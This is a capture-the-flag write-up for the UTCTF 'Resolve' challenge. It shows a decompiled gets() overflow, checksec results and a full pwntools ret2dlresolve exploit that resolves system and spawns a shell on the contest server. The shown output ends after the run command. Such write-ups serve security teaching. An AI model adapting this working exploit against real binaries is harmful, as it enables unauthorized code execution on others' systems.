## Challenge

Yeah you have an overflow, but where do you even jump to? If only there was
some sort of way to find the address of system.

`nc pwn.utctf.live 5435`

Attachments: `resolve`

## Overview

I threw it into Ghidra and got this:
```c
int main() {
  char buf[8];
  gets(buf);
  return 0;
}
```

Wow another tiny pwn challenge!
Let's do `checksec`:

```
$ checksec resolve
[*] '/home/plushie/Programs/bbb_writeups/2021/utctf/Resolve/resolve'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

The challenge hints at ret2dlresolve, which should work since there's no PIE
and stack canary.
Luckily I saw a super elegant ret2dlresolve solution to [babyrop](https://ctftime.org/task/14690)
DiceCTF from theKidOfArcrania, so I just edited it slightly and it worked!

Pwntools is so powerful sometimes it makes me feel like a script kiddie lol.

```python
import pwn

pwn.context.binary = e = pwn.ELF("./resolve")

# p = pwn.process("./resolve")
p = pwn.remote("pwn.utctf.live", 5435)

if pwn.args.GDB:
    pwn.gdb.attach(
        p,
        gdbscript="""
break *(&main+29)
continue
    """,
    )

r = pwn.ROP(e)
d = pwn.Ret2dlresolvePayload(e, symbol="system", args=["sh"])
r.raw(0x401159)  # ret gadget to align stack
r.gets(d.data_addr)
r.ret2dlresolve(d)

payload = pwn.fit({0x10: r.chain()}) + b"\n" + d.payload
p.sendline(payload)
p.interactive()
```

Output:
```
$ python3 solve.py
